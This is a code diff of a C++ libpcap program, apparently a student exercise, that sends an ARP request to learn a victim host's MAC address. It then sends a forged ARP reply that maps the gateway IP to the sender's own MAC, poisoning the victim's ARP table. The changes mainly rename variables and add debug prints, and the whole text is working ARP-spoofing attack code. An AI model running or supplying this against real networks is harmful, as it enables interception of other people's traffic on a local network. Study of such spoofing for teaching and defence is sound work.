@@ -54,14 +54,14 @@ std::string GetMyMac(const std::string dev_){
 /**
  * @brief Get target MAC address as string.
  * 
- * @param dev_ 			NIC deivce name.
- * @param targetIP_ 	target IP address.
- * @return std::string	target MAC address.
+ * @param dev_ NIC deivce name.
+ * @param IP_ target IP address.
+ * @return std::string target MAC address.
  * 
  * @details	Send ARP req packet to target, get ARP rep packet,
  * 			and get target MAC address from ARP rep packet.
  */
-std::string GetTargetMac(const char* dev_, const std::string myMac_, const std::string targetIP_){
+std::string GetMac(const char* dev_, const std::string myMac_, const std::string IP_){
 	char errbuf[PCAP_ERRBUF_SIZE];
 
 	// modified params to use pcap_next_ex().
@@ -90,7 +90,7 @@ std::string GetTargetMac(const char* dev_, const std::string myMac_, const std::
 	packetArpReq.arp_.sip_ = htonl(Ip("0.0.0.0"));
 
 	packetArpReq.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packetArpReq.arp_.tip_ = htonl(Ip(targetIP_));
+	packetArpReq.arp_.tip_ = htonl(Ip(IP_));
 
 	// send normal ARP req packet.
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetArpReq), sizeof(EthArpPacket));
@@ -117,10 +117,10 @@ std::string GetTargetMac(const char* dev_, const std::string myMac_, const std::
 
 	pcap_close(handle);
 
-	std::string targetMac(packetArpRep->arp_.smac_);
+	std::string Mac_(packetArpRep->arp_.smac_);
 	free(packetArpRep);
 	
-	return targetMac;
+	return Mac_;
 }
 
 
@@ -135,6 +135,7 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "couldn't get my MAC address\n");
 		return -1;
 	}
+	printf("myMac=%s\n", myMac.c_str());
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -144,15 +145,16 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 	
-	// generate malicious ARP rep packet.
-	EthArpPacket packet;
-	std::string targetMac = GetTargetMac(dev, myMac, argv[2]);
-	if (targetMac == ""){
+	std::string senderMac = GetMac(dev, myMac, argv[2]);
+	if (senderMac == ""){
 		fprintf(stderr, "couldn't get target MAC address\n");
 		return -1;
 	}
+	printf("senderMac=%s\n", senderMac.c_str());
 
-	packet.eth_.dmac_ = Mac(targetMac);			// Target MAC
+	// generate malicious ARP rep packet.
+	EthArpPacket packet;
+	packet.eth_.dmac_ = Mac(senderMac);			// Sender MAC
 	packet.eth_.smac_ = Mac(myMac);				// My MAC
 	packet.eth_.type_ = htons(EthHdr::Arp);
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -162,10 +164,10 @@ int main(int argc, char* argv[]) {
 	packet.arp_.op_ = htons(ArpHdr::Reply);		// gen ARP rep packet.
 	packet.arp_.smac_ = Mac(myMac);				// My MAC
 	packet.arp_.sip_ = htonl(Ip(argv[3]));		// GW IP
-	packet.arp_.tmac_ = Mac(targetMac);			// Target MAC
-	packet.arp_.tip_ = htonl(Ip(argv[2]));		// Target IP
+	packet.arp_.tmac_ = Mac(senderMac);			// Sender MAC
+	packet.arp_.tip_ = htonl(Ip(argv[2]));		// Sender IP
 
-	// poisoning target ARP table.
+	// poisoning sender ARP table.
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
